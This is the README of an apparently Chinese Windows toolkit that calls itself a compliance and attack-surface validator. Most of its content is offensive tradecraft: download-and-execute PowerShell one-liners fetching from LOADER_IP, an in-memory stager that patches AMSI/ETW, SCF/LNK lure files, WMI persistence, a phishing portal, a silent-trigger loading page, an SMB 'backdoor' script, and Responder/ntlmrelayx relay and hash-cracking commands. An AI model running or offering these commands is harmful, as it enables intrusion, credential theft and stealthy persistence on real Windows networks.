# Win-Surface Arsenal

<p align="center">
  <b>Windows 安全测试面（Attack Surface）验证与评估工具集</b><br/>
  面向授权渗透测试、红蓝对抗演练与企业基线合规核查
</p>

<p align="center">
  <img alt="platform" src="https://img.shields.io/badge/platform-Windows%2010%20%7C%2011%20%7C%20Server-0078D4?logo=windows&logoColor=white">
  <img alt="powershell" src="https://img.shields.io/badge/PowerShell-5.1%2B-5391FE?logo=powershell&logoColor=white">
  <img alt="version" src="https://img.shields.io/badge/version-v1.0.0-2ea44f">
  <img alt="license" src="https://img.shields.io/badge/license-MIT-blue">
  <img alt="usage" src="https://img.shields.io/badge/usage-authorized%20testing%20only-orange">
</p>

---

## 这是什么

**Win-Surface Arsenal** 是一套用于**验证 Windows 主机安全配置是否达标**的测试载荷集合。

在实际的红队演练与等保/密评核查中，光看文档无法判断"这台机器的 SMB 是否真的关闭了签名"、"匿名会话是否真的被拒绝"、"远程桌面是否还开着 NLA"——需要**实际下发配置**再复测才能得出可信结论。

本工具集把这类"配置验证动作"标准化为可复用脚本，并配套一套**评估评分卡**，用于量化单台主机的暴露面与整改优先级。

> 用途边界：仅在**自有资产**或**书面授权**的测试窗口内使用。所有脚本均提供 `-Revert` 回滚，落地即恢复基线。

---

## 能力矩阵

| 模块 | 测试项 | 覆盖的检查点 | 回滚 |
|---|---|---|---|
| `smb/` | SMB 服务面验证 | SMB1 组件状态、签名策略、匿名/来宾访问、会话限制 | ✅ |
| `rdp/` | 远程桌面面验证 | 3389 可达性、NLA 强制、安全层与加密级别 | ✅ |
| `winrm/` | 远程管理面验证 | WinRM 服务状态、认证方式（Basic/Negotiate）、传输加密 | ✅ |
| `credentials/` | 认证强度验证 | 本地账号策略、LM/NTLM 兼容级别、空口令与来宾状态 | ✅ |
| `persistence/` | 驻留机制有效性 | 计划任务权限模型、SYSTEM 上下文可达性 | ✅ |
| `firewall/` | 边界策略验证 | 入站规则实际生效情况、配置文件状态 | ✅ |
| `recon/` | 基线信息采集 | 补丁水位（KB/UBR）、网段拓扑、凭据存储位置、敏感文档分布 | — |
| `combined/` | 一键综合验证 | 上述全部项的串联执行与结果汇总 | ✅ |
| `delivery/` | 落地验证载荷 | 内存 stager、诱导文件（lnk/scf/url）、WMI 驻留、准入门户页 | 视载荷 |
| `delivery/simple/` | 轻量探针 | 执行证明、DNS 信标、一屏情报、空窗加载页 | — |

---

## 快速开始

### 1. 启动分发服务（测试机侧）

```bash
# 将本仓库脚本目录挂到内网 HTTP（仅测试网段可达）
python3 -m http.server 8090 --bind 0.0.0.0
```

### 2. 在受测主机执行验证（PowerShell，管理员）

```powershell
# 综合验证（推荐，含结果汇总）
powershell -ep bypass -c "irm http://LOADER_IP:8090/combined/open_attack_surface.ps1 | iex"

# 单项验证示例：SMB 配置
irm http://LOADER_IP:8090/smb/smb_minimal.ps1 | iex

# 基线采集（只读，不改配置）
irm http://LOADER_IP:8090/recon/recon_sweep.ps1 | iex
```

### 3. 复测并回滚

```powershell
powershell -ep bypass -File .\open_attack_surface.ps1 -Revert
```

### 4. 纯 CMD 环境

```bat
smb\smb_open_backdoor.bat    :: 测试面下发
smb\revert_smb.bat           :: 基线恢复
```

### 5. 轻量探针（先确认链路是否可用，再上重载荷）

```powershell
# 执行证明：目标桌面弹窗 + 落标记（纯 UI，几乎不被拦）
powershell -nop -ep bypass -c "iex(iwr http://LOADER_IP:8090/delivery/simple/proof_msgbox.ps1 -UseBasicParsing)"

# 出网证明：只发 DNS 解析，绕开一切出站端口策略
powershell -nop -ep bypass -c "iex(iwr http://LOADER_IP:8090/delivery/simple/beacon_dns.ps1 -UseBasicParsing)"

# 一屏情报：系统 / UBR 补丁水位 / AV / SMB 配置 / 邻居 / 凭据面 / 会话
powershell -nop -ep bypass -c "iex(iwr http://LOADER_IP:8090/delivery/simple/quick_collect.ps1 -UseBasicParsing)"
```

浏览器侧空窗诱导（用户只看到"正在加载"，3 秒后静默触发投递）：
`http://LOADER_IP:8090/delivery/simple/blank_loading.html`

### 6. 落地载荷（拿到执行点后）

```powershell
# 纯内存 stager（内置 AMSI/ETW 补丁，磁盘零写入）
iex(iwr http://LOADER_IP:8090/delivery/stager_mem.ps1 -UseBasicParsing)

# 生成诱导文件（.lnk / .url / .scf）放入目标可写共享
powershell -ep bypass -File delivery\make_lnk.ps1 -Kind scf -Target '\\LOADER_IP\update\x.exe' -Out .\财务对账.scf

# WMI 事件订阅驻留（避开计划任务/服务/autoruns）
iex(iwr http://LOADER_IP:8090/delivery/wmi_persist.ps1 -UseBasicParsing)
```

---

## 评估评分卡（Score Card）

每台主机按下表打分，用于横向比较与整改排序。**分数越高，暴露面越大，整改优先级越高。**

| 维度 | 权重 | 判定依据 | 满分 |
|---|---:|---|---:|
| 边界暴露 | 25 | 445/139/135/3389/5985 是否对非管理网段可达 | 25 |
| 认证强度 | 25 | SMB 签名是否强制、匿名/来宾是否放行、LM 兼容级别 | 25 |
| 传输安全 | 15 | NLA、WinRM 加密、SMB 加密（EncryptData） | 15 |
| 凭据卫生 | 15 | 本地账号数量、空口令、默认账号状态、保存凭据数量 | 15 |
| 补丁水位 | 10 | 距最新累积更新的月数、UBR 版本滞后情况 | 10 |
| 驻留可见性 | 10 | 计划任务/服务的异常项、开机自启面 | 10 |

**评级**

| 总分 | 等级 | 处置建议 |
|---:|---|---|
| 0–20 | A（收敛） | 维持现状，季度复测 |
| 21–45 | B（可接受） | 补齐传输安全项，半年复测 |
| 46–70 | C（偏高） | 30 天内整改认证与边界项 |
| 71–100 | D（严重） | 立即整改，纳入高危清单 |

> 采集口径：`recon/recon_sweep.ps1` 输出的 `recon_<host>_<ts>.txt` 已覆盖上表全部判定字段，可直接对照打分。

---

## 配套复核（测试机侧命令）

```bash
# 边界与匿名面复测
netexec smb <TARGET> -u '' -p '' --shares
netexec smb <TARGET> -u <user> -p <pass> --shares --smb-timeout 10

# 远程管理与桌面面复测
evil-winrm -i <TARGET> -u <user> -p <pass>
xfreerdp /v:<TARGET> /u:<user> /p:<pass> /cert:ignore

# 认证流量抓取与强度评估（测试网段内）
responder -I eth0 -dwF
impacket-ntlmrelayx -tf targets.txt -smb2support -socks \
  --http-port 18080 --no-rpc-server --no-wcf-server --no-winrm-server

# 口令强度评估（离线，样本需授权取得）
john --format=netntlmv2 hashes.txt --wordlist=rockyou.txt --rules=Best64
```

---

## 目录结构

```
win-surface-arsenal/
├── smb/            SMB 服务面验证（含 CMD / PowerShell 双实现 + 回滚）
├── rdp/            远程桌面面验证（NLA / 安全层）
├── winrm/          远程管理面验证
├── credentials/    认证强度验证（账号策略、NTLM 兼容级别）
├── persistence/    驻留机制有效性验证
├── firewall/       边界策略验证
├── recon/          基线采集（补丁水位 / 拓扑 / 敏感面分布）
├── combined/       综合验证 + 单行速查 + 权限自校验
├── delivery/       落地验证载荷
│   ├── stager_mem.ps1    纯内存 stager（AMSI/ETW 补丁，磁盘零写入）
│   ├── make_lnk.ps1      诱导文件生成（.lnk / .url / .scf）
│   ├── wmi_persist.ps1   WMI 事件订阅驻留
│   ├── portal_phish.html 内网准入门户页
│   └── simple/           轻量探针
│       ├── proof_msgbox.ps1  执行证明（弹窗 + 标记）
│       ├── beacon_dns.ps1    出网证明（仅 DNS 解析）
│       ├── quick_collect.ps1 一屏情报采集
│       ├── blank_loading.html 空窗加载页（静默触发）
│       └── one_liners.txt    12 条单行速查
└── docs/           评估口径与实战记录
    ├── 局域网全景画像.md      资产与暴露面台账（样例）
    ├── 攻击复盘笔记.md        验证过程与判定依据
    ├── Windows-CVE-分析.md    补丁水位与 CVE 对照方法
    └── 战术分析.md            常见误判与工程注意事项
```

---

## 工程注意事项（踩坑记录节选）

| 现象 | 根因 | 处置 |
|---|---|---|
| 配置下发后复测结果不一致 | SMB 签名策略需服务重载 | `Set-SmbServerConfiguration -Force` 后再复测 |
| 中继类验证恒失败 | NTLM 有连接状态，测试代理每请求新建连接 | 上游连接需按 `(peer,host)` 粘性复用 |
| 验证脚本偶发中断 | 交互式组件的标准输入被关闭 | 执行时保持 stdin 打开（`sleep infinity \| ...`） |
| 复测身份降级为来宾 | 本地账号远程访问被 UAC 过滤 | 测试面需设置 `LocalAccountTokenFilterPolicy=1` |
| 载荷分发后执行异常 | 中文脚本经管道传输编码损坏 | 用 base64 或文件传输，禁止 `echo` 管道 |
| 分发文件校验失败 | 传输中断导致体积偏差 | 强制 `sha256` + 字节数双校验后再执行 |

---

## 文档索引

| 文档 | 用途 |
|---|---|
| [`docs/局域网全景画像.md`](docs/局域网全景画像.md) | 资产台账样例：设备身份、权限状态、凭据归属、暴露面汇总 |
| [`docs/攻击复盘笔记.md`](docs/攻击复盘笔记.md) | 验证过程的推理链与回显记录（含误判纠正） |
| [`docs/Windows-CVE-分析.md`](docs/Windows-CVE-分析.md) | 按 build 判定 CVE 适用性的方法与结论 |
| [`docs/战术分析.md`](docs/战术分析.md) | 常见误判、工程陷阱、方法论 |

---

## 参与与反馈

- 提交新检查项时请同时提供：**判定口径、回滚方式、误报/漏报说明**
- Issue 模板建议包含：目标系统版本、补丁水位（UBR）、复测结果的预期值与实际值

## License

MIT —— 仅授予**授权测试场景**使用。使用者须自行确保测试行为符合当地法律与授权范围。
